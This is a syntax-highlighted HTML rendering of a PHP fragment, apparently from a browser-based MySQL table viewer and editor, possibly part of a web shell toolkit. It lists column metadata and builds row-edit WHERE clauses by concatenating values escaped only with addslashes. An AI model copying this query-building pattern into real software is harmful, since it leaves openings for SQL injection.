<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;table border="0" cellpadding="3" cellspa</span><span style="color: #8abeb7; text-decoration: underline;">cing="0"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="head"&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">allowedit</span>) p(<span style="color: #8abeb7;">'&lt;td&gt;Action&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fieldnum</span> = @mysql_num_fields(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>=0;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>&lt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fieldnum</span>;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>++){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">name</span> = @mysql_field_name(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">type</span> = @mysql_field_type(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">len</span> = @mysql_field_len(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">"&lt;td nowrap&gt;</span><span style="color: #f0c674;">$name</span><span style="color: #8abeb7;">&lt;br&gt;&lt;span&gt;</span><span style="color: #f0c674;">$type</span><span style="color: #8abeb7;">(</span><span style="color: #f0c674;">$len</span><span style="color: #8abeb7;">)</span><span style="color: #8abeb7; text-decoration: underline;">"</span><span style="text-decoration: underline;">.((</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'UNI'</span><span style="text-decoration: underline;"> || </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) ? </span><span style="color: #8abeb7; text-decoration: underline;">'&lt;b&gt; - PRIMARY&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">).(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> ? </span><span style="color: #8abeb7; text-decoration: underline;">'&lt;b&gt; - Auto&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">"&lt;/span&gt;&lt;/td&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mn</span> = @mysql_fetch_assoc(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span>)){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #81a2be;">this</span>bg = bg();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #81a2be;">this</span>bg.<span style="color: #8abeb7;">'" onmouseover="</span><span style="color: #8abeb7; text-decoration: underline;">this.className=\'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="text-decoration: underline;">bg.</span><span style="color: #8abeb7; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">where</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tmp</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">b1</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#36873;&#21462;&#26465;&#20214;&#23383;&#27573;&#29992;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mn</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">inside</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">inside</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#26597;&#25214;&#20027;&#38190;&#12289;&#21807;&#19968;&#23646;&#24615;&#12289;&#33258;&#21160;&#22686;&#21152;&#30340;&#23383;&#27573;&#65292;&#25214;&#21040;&#23601;&#20572;&#27490;&#65292;&#21542;&#21017;&#32452;&#21512;&#25152;&#26377;</span><span style="color: #969896; font-style: italic; text-decoration: underline;">&#23383;&#27573;&#20316;&#20026;&#26465;&#20214;&#12290;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rowdb</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span>][<span style="color: #8abeb7;">'Key'</span>] == <span style="color: #8abeb7;">'UNI'</span><span style="text-decoration: underline;"> || </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">key</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> || </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">key</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #8abeb7; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">where</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span>.<span style="color: #8abeb7;">"='"</span>.addslashe<span style="text-decoration: underline;">s(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">inside</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">"'"</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">break</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">where</span> .= <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tmp</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span>.<span style="color: #8abeb7;">"='"</span>.addslas<span style="text-decoration: underline;">hes(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">inside</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">"'"</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tmp</span> = <span style="color: #8abeb7;">' AND '</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#35835;&#21462;&#35760;&#24405;&#29992;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mn</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">inside</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">b1</span> .= <span style="color: #8abeb7;">'&lt;td nowrap&gt;'</span>.html_clean(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">ins</span><span style="color: #f0c674; text-decoration: underline;">ide</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
